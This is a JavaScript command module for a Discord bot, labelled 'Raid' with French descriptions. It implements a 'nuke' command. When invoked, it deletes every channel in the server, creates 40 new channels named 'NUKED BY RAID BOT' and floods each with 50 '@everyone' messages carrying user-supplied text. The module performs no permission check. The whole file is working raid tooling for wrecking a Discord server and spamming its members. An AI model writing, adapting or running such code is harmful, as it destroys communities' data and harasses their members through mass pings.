const Discord = require('discord.js');

module.exports = {

    name: 'nuke',

    aliases: [],

    category: "Raid",

    description: "Supprime les channels et en crée en masse et ping dedans",

    usage: "nuke <message>",

    run: async (client, message, args) => {

        const nuke = args.join(' ');

        if (!nuke) {

            return message.reply("Veuillez refaire la commande.");

        }

        message.guild.channels.cache.forEach(channel => {

            channel.delete();

        });

        for (let i = 0; i < 40; i++) {

            const channel = await message.guild.channels.create('NUKED BY RAID BOT', {

                type: 'GUILD_TEXT',

                permissionOverwrites: [

                    {

                        id: message.guild.id,

                        allow: [Discord.Permissions.FLAGS.VIEW_CHANNEL]

                    }

                ]

            });

            for (let j = 0; j < 50; j++) {

                await channel.send({ content: `@everyone ${nuke}` });

            }

        }

    }

};